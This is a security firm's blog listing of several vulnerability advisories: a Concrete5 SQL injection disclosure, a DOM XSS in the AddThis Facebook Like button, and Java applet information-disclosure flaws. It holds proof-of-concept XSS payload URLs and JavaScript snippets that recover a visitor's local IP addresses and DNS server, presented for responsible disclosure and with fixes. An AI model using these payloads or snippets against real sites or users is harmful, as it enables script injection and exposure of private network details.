Furthermore we found the presence of a **SQL injection** vulnerability, which is due to certain user input being used to construct a SQL query without a proper validation. This can be exploited to carry out SQL injection attacks leading to unauthorized access to the data stored into the database.
However, the vulnerability is not critical because it is mitigated by the fact that can be exploited only by authenticated users with privileges to edit page permissions.
The following PDF describes the detail of the vulnerability and how to exploit it:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerability details sent through HackerOne

[05/08/2015] - Vendor said a patch has been committed and will be available in the next version

[05/12/2015] - Version [5.7.4.1](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-1-release-notes/) released along with the patch for this vulnerability

[06/11/2015] - Vulnerability publicly disclosed on [HackerOne](https://hackerone.com/reports/59664)

Stay tuned for the second part!

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[5:06 AM](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=3570571547528842091&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
,
[Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)

## Thursday, September 27, 2012

# [Analysis of Dom Xss vulnerability in a Facebook Like Button implementation](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html)

Note: The following vulnerability is now patched. Thanks to Matt, Charlie and to the Addthis.com team that released a patch yesterday after receiving our advisory.

### Description

I like very much facebook, and I like clicking on facebook like buttons like the one below. *Addthis.com* has its own implementation of *Facebook Like Button* and is very used among internet websites. They estimate that unique websites around the world are several millions.

A Facebook Like Button in a Share Widget Bar:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC5QR9Gmbv2gUYESiJ0tWWeVQ9Mk_7Y5ZzL_lC8u7HLW2nxFK9dm4dvB0OhD2iQT_aawp4uTGW2dMqSEMrt-FIdgl47qlHfTZchT9GEYvDHTbvIbfctLlWtQB-BNjd17L67fFgtQD3ew/s400/facebooklike.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC5QR9Gmbv2gUYESiJ0tWWeVQ9Mk_7Y5ZzL_lC8u7HLW2nxFK9dm4dvB0OhD2iQT_aawp4uTGW2dMqSEMrt-FIdgl47qlHfTZchT9GEYvDHTbvIbfctLlWtQB-BNjd17L67fFgtQD3ew/s1600/facebooklike.png)

You can find some background information already in one of our previous posts:

•    <http://blog.mindedsecurity.com/2012/09/temporary-patch-for-dom-xss-0day-in.html>

### Proof of Concept

**http://www.website-with-addthis-widget.con/#"></fb:like><img/src="aaa"/onerror="alert('DomXss Found!')**

*Note: This reflected dombased cross site scripting (before the patch) was present in a tremendous number of websites*

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy8ICgzlMiUaMsmtu3m18XhBYUh38S5zyCWGewn_ldZVNRrQl8CtLBy5LaIjnu1pef-70eBSguXa-tTa6I15X2BCSdHDoSfD4GWKvG2IvztwlgVaUmPnLX51lbHBMOkeeXJe8fT8fMJQ/s400/addowned2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy8ICgzlMiUaMsmtu3m18XhBYUh38S5zyCWGewn_ldZVNRrQl8CtLBy5LaIjnu1pef-70eBSguXa-tTa6I15X2BCSdHDoSfD4GWKvG2IvztwlgVaUmPnLX51lbHBMOkeeXJe8fT8fMJQ/s1600/addowned2.png)

####

#### Vulnerable Code

```

if (F.href === _1) {
d = _8.util.clone(E.share.url_transforms || {});
d.defrag = 1;
F.href = _8.track.mgu(E.share.url, d);//-- Location
}
for (A in F) {
B += " " + A + "=\"" + F[A] + "\"";//-- Attribute Set
}
if (!E.share.xid) {
E.share.xid = _8.util.cuid();
}
f[F.href] = {};
for (A in E.share) {
f[F.href][A] = E.share[A];&nbsp;
}
G.innerHTML = "<fb:like br="br"
ref="\">_8.share.gcp(E.share, E.conf,".like").replace(",", "_")
+ "\" " + B + "</fb:like>"; //-- DomXss
p(G);

```

### Analysis and discovery with DOMinatorPro

Even if to the reader this issue seems like a common cross site scripting, finding such kind of security issues in Javascript code (aka DomXss) is an extremely complex task.

This is why our Advanced Research team developed DOMinatorPro. DOMinatorPro can be downloaded from the following dedicated website: [http://dominator.mindedsecurity.com](http://dominator.mindedsecurity.com/).

**DOMinatorPro is a Free Opensource Project with Commercial Extensions. Commercial extensions have a 15 days Free Trial Period.**

The vulnerability was in ONE of the scripts loaded by the “addthis\_widget.js”  script available online at “<http://s7.addthis.com/js/300/addthis_widget.js>”. As you can see multiple scripts are loaded and the scripts are compressed and obfuscated , giving to human security reviewers a painful and a very long and time comsuming task to accomplish.

*Note: The following part is taken from the DOMinatorPro user manual and shows a similar vulnerability in a demo context. In* **DOMinatorPro* user manual you can find sample cases to help you understand the cause of the vulnerability for producing solid Javascript patches.*

By the way, when browsing to a website with a vulnerable
“Facebook - Like Button” with DOMinatorPro tool you will see in a
couple of seconds the following alert:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxOp9l2ix_YVj21ZGszanxVLo7fxWwfvZ96k4q8FyhwwPLROG3tGVcWQyEHnhk-QEzp-cXwRItYVmPppZ6PhpannzTkn3EhhrfiBslazBsMB57zEkRXY-2dseyM9SiD46WzQQ9O9A7MQ/s400/alert.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxOp9l2ix_YVj21ZGszanxVLo7fxWwfvZ96k4q8FyhwwPLROG3tGVcWQyEHnhk-QEzp-cXwRItYVmPppZ6PhpannzTkn3EhhrfiBslazBsMB57zEkRXY-2dseyM9SiD46WzQQ9O9A7MQ/s1600/alert.png)
From the previous screenshot the very interesting information is that you got an HTML Injection (e.g. Cross Site Scripting) from the *location.href* (e.g. the URL).
Important Note: Sink describes where the vulnerability is and the Source is where the controllable input comes from.

Summary of the issue: *HTML injection vulnerability coming from a user supplied input location.href (URL)*.

#### Source History

Next step is to check where this issue has been found. This is easy, looking at the source history:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPrc7gkxa-elcDVF0IWCUY_lRdygFcImS_D_LXiPYaZpZCz62f0W0iya4WbnK0LRDlkmVQi2xpyiyAVVI4GHq_T9NdvourWMCq8Gr5JpJPH1YWu7I0GwmA6VcuoSFwFiuqZFnujLZt6g/s400/history.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPrc7gkxa-elcDVF0IWCUY_lRdygFcImS_D_LXiPYaZpZCz62f0W0iya4WbnK0LRDlkmVQi2xpyiyAVVI4GHq_T9NdvourWMCq8Gr5JpJPH1YWu7I0GwmA6VcuoSFwFiuqZFnujLZt6g/s1600/history.png)
Exact location of the issue is:

* **http://www.vulnerablewebsite.con/webpage.aspx?menuid=3#injectedstring<>”’**

Source history is a simplified call stack that shows the content of controllable strings.
Location.href can be controlled and the value is showed up in light green, after this string is concatenated with another string by left and by right.
As it is possible to see from the above picture, it’s also possible to check if there are validator functions in place by injecting HTML patterns after the # (hash); in this case I injected the pattern #injectedstring<>”’ after the vulnerable URL. Using the “Hash” sign is important because anything coming after it will not be sent to the server.
It’s possible to see from the last line that #injectedstring<>"' is not encoded (typical encoded string is in the form of: #injectedstring%3c%22%27).
By supplying now the correct exploit it is possible to turn the vulnerability into a reflected DOM cross site scripting attack:

*Standard HTML Injection Payload:*

* **<img/src="aaa"/onerror="alert('DomXss Found!')">**

Important Note: Thanks to DOMinatorPro Browser emulation feature we can mimic different browser insecure behaviors. This permits to show developers the vulnerability inside DOMinatorPro/Firefox, even if the previous exploit works only under Internet Explorer.

#### Call Stack

Now for a developer it is time to open the “Call Stack”:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEius2T1Ci1j29sCf6XX_mQ78HykShpYmAmYLIErM2VIVGla19GoFLgGUetNgZc6nEdrlnkpr-mpQynBVSR_FKtE9Ml4xDEdSDh8L5SeZyqc3L5smu8bKLw2JNlOygFxQJmuo7lkrUGmHw/s400/callstack.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEius2T1Ci1j29sCf6XX_mQ78HykShpYmAmYLIErM2VIVGla19GoFLgGUetNgZc6nEdrlnkpr-mpQynBVSR_FKtE9Ml4xDEdSDh8L5SeZyqc3L5smu8bKLw2JNlOygFxQJmuo7lkrUGmHw/s1600/callstack.png)
The Call Stack interactively shows where the vulnerability is with the correct line. It is possible to see “document.location.href” is not escaped properly.
It’s very important to output encode the value before it is displayed.
#### Fixing

Correct fixing at line 116:
•    Use the “encodeURIComponent()” function.

By
Giorgio Fedon

at

[3:20 AM](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=7885927123740178257&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
,
[Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
,
[web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

## Monday, October 11, 2010

# [Get Internal Network Information with Java Applets](https://blog.mindedsecurity.com/2010/10/get-internal-network-information-with.html)

The [first two issue](http://blog.mindedsecurity.com/2010/10/java-6u21-seven-issues-summary.html) on Java Applets are related to Information disclosure.

In particular a malicious user could get important information about private IP of each NIC a victim has on her platform.

17364779 NETWORKINTERFACE HASHCODE PROBLEM

Summary
It is possible to infer network IP on any local NIC via HASHCODE.

Analysis
It is known since Java v1.4 that Applets expose some network information of a user machine.
It is in fact possible to use
 `java.net.Socket( host,port)).getLocalAddress().getHostAddress();`

which does work according to SOP ([Example here](http://reglos.de/myaddress/)).
Since Java 6 several other methods have been added which disclose Nic names, MAC and other [information](http://download.oracle.com/javase/6/docs/api/java/net/NetworkInterface.html).
There is however some limitation on the information that can be gathered, and in particular it's not possible to get the IPs because they are tied to Same Origin Policy; for example is not possible to get the IP of VPN local interface.

We found that it is possible to bypass SOP by reversing the Hashcode of NetworkInterface object.
Hashcode on NetworkInterface is calculated as follows:
 `public int hashCode() {
 int i = 0;
 if (this.addrs != null) {
 for (int j = 0; j <>

As can be seen NetworkInterface hashCode is the sum of each attached IP hashCode which is computed in the following way:

public int hashCode()
{
 return this.address;
}
// Where address is :
 if ((paramArrayOfByte != null) &&
 (paramArrayOfByte.length == 4)) {
 this.address = (paramArrayOfByte[3] & 0xFF);
 this.address |= paramArrayOfByte[2] <<>

It is hence possible to reverse the hashCode to the address by simply using the following code:

d=Packages.java.net.NetworkInterface.getByName("eth0").hashCode();
IP=(d>>>24&0xff)+"."+(d>>>16 &0xff)+"."+(d>>>8 &0xff)+"."+(d &0xff)

But, what happens if there are more IPs bound to a single NIC?
It depends. Linux for example generates unused IPv6 addresses from MAC Address so it's possible to calculate it from the value returned by:

nic.getHardwareAddress();

And then use it to get the IPv4.

17322679 JAVA APPLET DNS IP DISCLOSURE

Summary
It is possible to get the DNS address of a victim.

Analysis

The SOP mechanism on new Java 6 applets is similar to Flash.
Before doing any action it check for the existance of crossdomain.xml files.
It was found that when we try to explicitly resolve a name using Packages.javax.naming package
setting the DNS to "dns://" Java VM will get the default DNS and ask it for crossdomain.xml file with a HTTP request on port 80.
If DNS drops packets on port 80 then Java will wait until socket will timeout, otherwise will return immediately with an error.
The error contains the DNS IP. The attacker can easily get the DNS IP from the error and use it for further attacks (DNS Cache Poisoning and so on).

function f(){
try{
env=new Packages.java.util.Hashtable()
env.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
env.put("java.naming.provider.url", "dns://");
ctx=new Packages.javax.naming.directory.InitialDirContext(env);
attrs = ctx.getAttributes("www.wisec.it",['*']);
}catch(e){alert(e)}
}
setTimeout(f,1);

Proof Of Concept
An example of what an attacker can gather from an applet can be found [here](http://www.wisec.it/j_test/getInfo.html)
(should work on almost every browser maybe Safari has some problem):

There are a couple of non resolved issues:
If windows supports IPV6 and there are IPv4 + IPv6 IPs on a single interface it is not possible to infer them since Hashcode cannot be reversed.
You'll need to wait for socket timeout to have your DNS IP discovered so be patient.
The applet will get:`

* Your DNS IP
* If you are using a proxy
* If you are using an authentication over the proxy (if TRACE Method enabled)
* Your proxy credentials
* Your NIC interfaces comprehensive of your IP, MAC Address and some other infos

To be noted that MAC address revelation is a feature.

Ps. As you'll probably notice after running the POC, I also found that Java 6 plugin exposes to Javascript (java & Packages objects) on every browser but we will talk about it on another post.

By

[Stefano Di Paola](https://www.blogger.com/profile/18241677936736054546 "author profile")

at

[10:51 PM](https://blog.mindedsecurity.com/2010/10/get-internal-network-information-with.html "permanent link")

[1 comment
:](https://blog.mindedsecurity.com/2010/10/get-internal-network-information-with.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=5399995869433708338&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5399995869433708338&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5399995869433708338&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5399995869433708338&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5399995869433708338&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=5399995869433708338&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
,
[Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
,
[Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
,
[Java](https://blog.mindedsecurity.com/search/label/Java)

# [Java 6u21 Seven Issues Summary](https://blog.mindedsecurity.com/2010/10/java-6u21-seven-issues-summary.html)

After several months since I contacted Oracle informing them about ten issues on Java applet security, they will release an important update of Java today.

It fixes several security issues, seven of which were found by me in May.

There will be some post on this blog describing the issues and an impact analysis.

In particular the issues are in order of impact the following:

* [Information Disclosure](http://blog.mindedsecurity.com/2010/10/get-internal-network-information-with.html):

+ 17364779 NETWORKINTERFACE HASHCODE PROBLEM
+ 17322679 JAVA APPLET DNS IP DISCLOSURE

* [User Assisted Arbitrary Execution:](http://blog.mindedsecurity.com/2010/10/java-jnlp-applet-user-assisted.html)

+ 17322757 ZERO TERMINATOR ALLOWS JNLP SHORTCUTS
+ 17322755 NEW LINES IN JNLP TITLE ARE COPIED INTO LNK FILES

* Network and WEB Attacks:

+ [17322683 HTTP REQUEST SPLITTING WITH JAVA ADDREQUESTPROPERTY](http://blog.mindedsecurity.com/2010/10/http-request-splitting-and-header-abuse.html)
+ [17764405 DNS REBINDING ISSUE](http://blog.mindedsecurity.com/2010/10/dns-rebinding-on-java-applets.html)
+ [17322681 JAVA APPLET SAME IP HOST ACCESS](http://blog.mindedsecurity.com/2010/10/java-applet-same-ip-host-access.html)

Disclosure Timeline
20th Apr - 6 May 2010: Advisories sent to Oracle
25th June 2010: Oracle Confirms all issues
12 Oct 2010: Java update 22 released which fixes 7 out of 10 issues.
11-20 Oct 2010: Minded Security Advisories publicly disclosed.

Credits:
All the issues were found by Stefano Di Paola of Minded Security

By

[Stefano Di Paola](https://www.blogger.com/profile/18241677936736054546 "author profile")

at

[10:38 PM](https://blog.mindedsecurity.com/2010/10/java-6u21-seven-issues-summary.html "permanent link")

[1 comment
:](https://blog.mindedsecurity.com/2010/10/java-6u21-seven-issues-summary.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=50105364473745461&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=50105364473745461&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=50105364473745461&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=50105364473745461&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=50105364473745461&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=50105364473745461&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
,
[Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
,
[Java](https://blog.mindedsecurity.com/search/label/Java)

[Older Posts](https://blog.mindedsecurity.com/search/label/Advisory?updated-max=2010-10-11T22:38:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* Advisory

  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
